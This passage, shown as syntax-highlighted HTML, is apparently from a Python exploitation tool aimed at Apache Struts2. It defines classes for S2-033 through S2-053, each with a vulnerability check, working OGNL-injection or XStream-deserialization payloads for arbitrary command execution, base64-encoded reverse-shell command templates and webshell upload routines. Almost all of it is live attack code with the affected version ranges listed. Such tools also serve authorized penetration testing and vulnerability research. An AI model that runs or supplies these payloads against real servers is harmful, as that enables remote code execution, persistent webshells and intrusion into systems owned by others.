self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd), encoding=self.encoding)</span><br><span class="line">        html = get_stream(self.url + &#x27;?&#x27; + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_033:</span><br><span class="line">    &quot;&quot;&quot;S2-033漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-033:影响版本Struts 2.3.20-2.3.28(除了2.3.20.3和2.3.24.3); GET请求发送数据; 支持任意命令执行和反弹shell&quot;</span><br><span class="line">    check_poc = &quot;%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=10086&quot;</span><br><span class="line">    exec_payload = &quot;%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=&#123;cmd&#125;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        if url.endswith(&#x27;/&#x27;):</span><br><span class="line">            self.url = url</span><br><span class="line">        else:</span><br><span class="line">            self.url = url + &#x27;/&#x27;</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;选择可以利用成功的payload&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + self.check_poc, self.headers, self.encoding)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif html == &quot;1008660253718&quot;:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-033&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get_stream(self.url + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_037:</span><br><span class="line">    &quot;&quot;&quot;S2-037漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-037:影响版本Struts 2.3.20-2.3.28.1; GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell&quot;</span><br><span class="line">    web_path = &quot;%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;pp=%2f&quot;</span><br><span class="line">    exec_payload = &quot;(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=16456&amp;command=&#123;cmd&#125;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        if url.endswith(&#x27;/&#x27;):</span><br><span class="line">            self.url = url</span><br><span class="line">        else:</span><br><span class="line">            self.url = url + &#x27;/&#x27;</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;选择可以利用成功的payload&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-037&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + self.web_path, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get_stream(self.url + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_045:</span><br><span class="line">    &quot;&quot;&quot;S2-045漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-045:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径,任意命令执行,反弹shell和文件上传&quot;</span><br><span class="line">    web_path = r&quot;&quot;&quot;%&#123;(#fuck=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath(&quot;/&quot;))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;&quot;&quot;</span><br><span class="line">    exec_payload = r&quot;&quot;&quot;%&#123;(#fuck=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;CMD&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;&quot;&quot;</span><br><span class="line">    upload_payload = r&quot;&quot;&quot;%&#123;(#fuck=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#fos= new java.io.FileOutputStream(#req.getParameter(&quot;f&quot;)),#fos.write(#req.getParameter(&quot;t&quot;).getBytes()),#fos.close()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(&quot;OK&quot;),(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())))&#125;&quot;&quot;&quot;</span><br><span class="line">    shell = &quot;&#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.data = data</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-045&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span><br><span class="line">        self.headers[&#x27;Content-Type&#x27;] = self.web_path</span><br><span class="line">        html = post(self.url, self.data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        self.headers[&#x27;Content-Type&#x27;] = self.exec_payload.replace(&#x27;CMD&#x27;, cmd)</span><br><span class="line">        html = post_stream(self.url, self.data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def upload_shell(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = &quot;?t=&#123;shell&#125;&amp;f=&#123;path&#125;&quot;.format(shell=quote(shell), path=upload_path)</span><br><span class="line">        self.headers[&#x27;Content-Type&#x27;] = self.upload_payload</span><br><span class="line">        html = post(self.url + data, self.data, self.headers, self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_046:</span><br><span class="line">    &quot;&quot;&quot;S2-046漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-046:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径,任意命令执行,反弹shell和文件上传&quot;</span><br><span class="line">    web_path = &quot;%&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(&#x27;text/html;charset=ENCODING&#x27;)).(#res.getWriter().print(&#x27;&#x27;)).(#res.getWriter().print(&#x27;&#x27;)).(#res.getWriter().print(#req.getSession().getServletContext().getRealPath(&#x27;/&#x27;))).(#res.getWriter().flush()).(#res.getWriter().close())&#125;\0b&quot;</span><br><span class="line">    check_poc = &quot;%&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(&#x27;text/html;charset=ENCODING&#x27;)).(#res.getWriter().print(&#x27;security_&#x27;)).(#res.getWriter().print(&#x27;check&#x27;)).(#res.getWriter().flush()).(#res.getWriter().close())&#125;\0b&quot;</span><br><span class="line">    exec_payload = &quot;%&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(&#x27;text/html;charset=ENCODING&#x27;)).(#s=new java.util.Scanner((new java.lang.ProcessBuilder(&#x27;CMD&#x27;.toString().split(&#x27;\\\\s&#x27;))).start().getInputStream()).useDelimiter(&#x27;\\\\AAAA&#x27;)).(#str=#s.hasNext()?#s.next():&#x27;&#x27;).(#res.getWriter().print(#str)).(#res.getWriter().flush()).(#res.getWriter().close()).(#s.close())&#125;\0b&quot;</span><br><span class="line">    upload_paylaod = &quot;%&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(&#x27;text/html;charset=ENCODING&#x27;)).(#filecontent=&#x27;SHELL&#x27;).(new java.io.BufferedWriter(new java.io.FileWriter(&#x27;PATH&#x27;)).append(new java.net.URLDecoder().decode(#filecontent,&#x27;ENCODING&#x27;)).close()).(#res.getWriter().print(&#x27;O&#x27;)).(#res.getWriter().print(&#x27;K&#x27;)).(#res.getWriter().print(#req.getContextPath())).(#res.getWriter().flush()).(#res.getWriter().close())&#125;\0b&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        files = &#123;&#x27;test&#x27;: (self.check_poc.replace(&#x27;ENCODING&#x27;, self.encoding), b&#x27;x&#x27;, &#x27;text/plain&#x27;)&#125;</span><br><span class="line">        html = post(self.url, files=files, encoding=self.encoding)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif html == &#x27;security_check&#x27;:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-046&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span><br><span class="line">        files = &#123;&#x27;test&#x27;: (self.web_path.replace(&#x27;ENCODING&#x27;, self.encoding), b&#x27;x&#x27;, &#x27;text/plain&#x27;)&#125;</span><br><span class="line">        html = post(self.url, files=files, encoding=self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        paylaod = self.exec_payload.replace(&#x27;CMD&#x27;, cmd).replace(&#x27;ENCODING&#x27;, self.encoding)</span><br><span class="line">        html = post_file(self.url, paylaod, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def upload_shell(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        files = &#123;&#x27;test&#x27;: (</span><br><span class="line">            self.upload_paylaod.replace(&#x27;SHELL&#x27;, quote(shell)).replace(&#x27;PATH&#x27;, upload_path).replace(&#x27;ENCODING&#x27;,</span><br><span class="line">                                                                                                    self.encoding),</span><br><span class="line">            b&#x27;x&#x27;,</span><br><span class="line">            &#x27;text/plain&#x27;)&#125;</span><br><span class="line">        html = post(self.url, files=files, encoding=self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_048:</span><br><span class="line">    &quot;&quot;&quot;S2-048漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-048:影响版本Struts 2.3.x with Struts 1 plugin and Struts 1 action; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell&quot;</span><br><span class="line">    check_poc = &quot;%24%7B&#123;num1&#125;%2B&#123;num2&#125;%7D&quot;</span><br><span class="line">    exec_payload = &quot;%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream())).(%23q)%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;username=test&amp;password=&#123;exp&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        num1 = random.randint(10000, 100000)</span><br><span class="line">        num2 = random.randint(10000, 100000)</span><br><span class="line">        poc = self.check_poc.format(num1=num1, num2=num2)</span><br><span class="line">        data = self.data.format(exp=poc)</span><br><span class="line">        html = post_stream(self.url, data, self.headers, self.encoding)</span><br><span class="line">        nn = str(num1 + num2)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif nn in html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-048&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_052:</span><br><span class="line">    &quot;&quot;&quot;S2-052漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-052:影响版本Struts 2.1.2-2.3.33,2.5-2.5.12; POST请求发送数据,不需要参数; 支持任意命令执行(无回显)和反弹shell,不支持检测该漏洞是否存在&quot;</span><br><span class="line">    exec_payload = &quot;&quot;&quot;&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</span><br><span class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</span><br><span class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                      &lt;command&gt;</span><br><span class="line">                        &#123;cmd&#125;</span><br><span class="line">                      &lt;/command&gt;</span><br><span class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">                    &lt;/next&gt;</span><br><span class="line">                  &lt;/iter&gt;</span><br><span class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                      &lt;parameter-types/&gt;</span><br><span class="line">                    &lt;/method&gt;</span><br><span class="line">                    &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">                  &lt;/filter&gt;</span><br><span class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">                &lt;/serviceIterator&gt;</span><br><span class="line">                &lt;lock/&gt;</span><br><span class="line">              &lt;/cipher&gt;</span><br><span class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="line">              &lt;done&gt;false&lt;/done&gt;</span><br><span class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</span><br><span class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</span><br><span class="line">              &lt;closed&gt;false&lt;/closed&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;&quot;&quot;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/xml&#x27;</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        cmd = parse_cmd(cmd, type=&#x27;xml&#x27;)</span><br><span class="line">        data = self.exec_payload.format(cmd=cmd)</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_053:</span><br><span class="line">    &quot;&quot;&quot;S2-053漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-053:影响版本Struts 2.0.1-2.3.33,2.5-2.5.10; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell&quot;</span><br><span class="line">    check_poc = &quot;%25%7B&#123;num1&#125;%2B&#123;num2&#125;%7D&quot;</span><br><span class="line">    exec_payload = &quot;%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3D&#x27;&#123;cmd&#125;&#x27;).(%23iswin%3D(%40java.lang.System%40getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(%23cmds%3D(%23iswin%3F%7B&#x27;cmd.exe&#x27;%2C&#x27;%2Fc&#x27;%2C%23cmd%7D%3A%7B&#x27;%2Fbin%2Fbash&#x27;%2C&#x27;-c&#x27;%2C%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream()))%7D%0A&quot;</span><br><span class="line">    shell = 